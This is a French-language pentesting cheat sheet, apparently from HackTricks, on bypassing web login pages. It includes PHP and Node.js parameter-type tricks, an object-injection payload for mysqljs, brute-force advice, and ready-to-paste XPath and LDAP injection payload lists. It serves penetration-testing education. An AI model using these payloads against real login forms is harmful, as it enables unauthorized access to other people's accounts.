# Bypass de connexion

{{#include ../../banners/hacktricks-training.md}}

## **Contourner la connexion régulière**

Si vous trouvez une page de connexion, voici quelques techniques à essayer pour la contourner :

- Vérifiez les **commentaires** à l'intérieur de la page (faites défiler vers le bas et à droite ?)
- Vérifiez si vous pouvez **accéder directement aux pages restreintes**
- Vérifiez de **ne pas envoyer les paramètres** (ne pas envoyer aucun ou seulement 1)
- Vérifiez l'**erreur de comparaison PHP :** `user[]=a&pwd=b`, `user=a&pwd[]=b`, `user[]=a&pwd[]=b`
- **Changez le type de contenu en json** et envoyez des valeurs json (bool true inclus)
- Si vous obtenez une réponse disant que POST n'est pas supporté, vous pouvez essayer d'envoyer le **JSON dans le corps mais avec une requête GET** avec `Content-Type: application/json`
- Vérifiez l'erreur de parsing potentielle de nodejs (lisez [**ceci**](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4)) : `password[password]=1`
- Nodejs transformera cette charge utile en une requête similaire à celle-ci : ` SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` `**`password=password=1`**`;` ce qui fait que le bit de mot de passe est toujours vrai.
- Si vous pouvez envoyer un objet JSON, vous pouvez envoyer `"password":{"password": 1}` pour contourner la connexion.
- N'oubliez pas que pour contourner cette connexion, vous devez toujours **connaître et envoyer un nom d'utilisateur valide**.
- **Ajouter l'option `"stringifyObjects":true`** lors de l'appel à `mysql.createConnection` bloquera éventuellement tous les comportements inattendus lorsque `Object` est passé en paramètre.
- Vérifiez les identifiants :
- [**Identifiants par défaut**](../../generic-hacking/brute-force.md#default-credentials) de la technologie/plateforme utilisée
- **Combinaisons courantes** (root, admin, mot de passe, nom de la technologie, utilisateur par défaut avec l'un de ces mots de passe).
- Créez un dictionnaire en utilisant **Cewl**, **ajoutez** le **nom d'utilisateur** et le mot de passe **par défaut** (s'il y en a) et essayez de le brute-forcer en utilisant tous les mots comme **noms d'utilisateur et mot de passe**
- **Brute-force** en utilisant un plus grand **dictionnaire (**[**Brute force**](../../generic-hacking/brute-force.md#http-post-form)**)**

### Contournement d'authentification par injection SQL

[Vous pouvez trouver plusieurs astuces pour contourner la connexion via **injections SQL**](../sql-injection/index.html#authentication-bypass).

Dans la page suivante, vous pouvez trouver une **liste personnalisée pour essayer de contourner la connexion** via des injections SQL :

{{#ref}}
sql-login-bypass.md
{{#endref}}

### Contournement d'authentification sans injection SQL

[Vous pouvez trouver plusieurs astuces pour contourner la connexion via **sans injections SQL**](../nosql-injection.md#basic-authentication-bypass)**.**

Comme les injections NoSQL nécessitent de changer la valeur des paramètres, vous devrez les tester manuellement.

### Contournement d'authentification par injection XPath

[Vous pouvez trouver plusieurs astuces pour contourner la connexion via **injection XPath.**](../xpath-injection.md#authentication-bypass)
```
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
```
### Contournement d'authentification par injection LDAP

[Here you can find several tricks to bypass the login via **LDAP Injection.**](../ldap-injection.md#login-bypass)
```
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
```
### Se souvenir de moi

Si la page a une fonctionnalité "**Se souvenir de moi**", vérifiez comment elle est implémentée et voyez si vous pouvez en abuser pour **prendre le contrôle d'autres comptes**.

### Redirections

Les pages redirigent généralement les utilisateurs après la connexion, vérifiez si vous pouvez modifier cette redirection pour provoquer un [**Open Redirect**](../open-redirect.md). Peut-être que vous pouvez voler des informations (codes, cookies...) si vous redirigez l'utilisateur vers votre site.

## Autres vérifications

- Vérifiez si vous pouvez **énumérer les noms d'utilisateur** en abusant de la fonctionnalité de connexion.
- Vérifiez si **l'auto-complétion** est active dans les formulaires de mot de passe/**informations sensibles** **input:** `<input autocomplete="false">`

## Outils automatiques

- [HTLogin](https://github.com/akinerkisa/HTLogin)



{{#include ../../banners/hacktricks-training.md}}
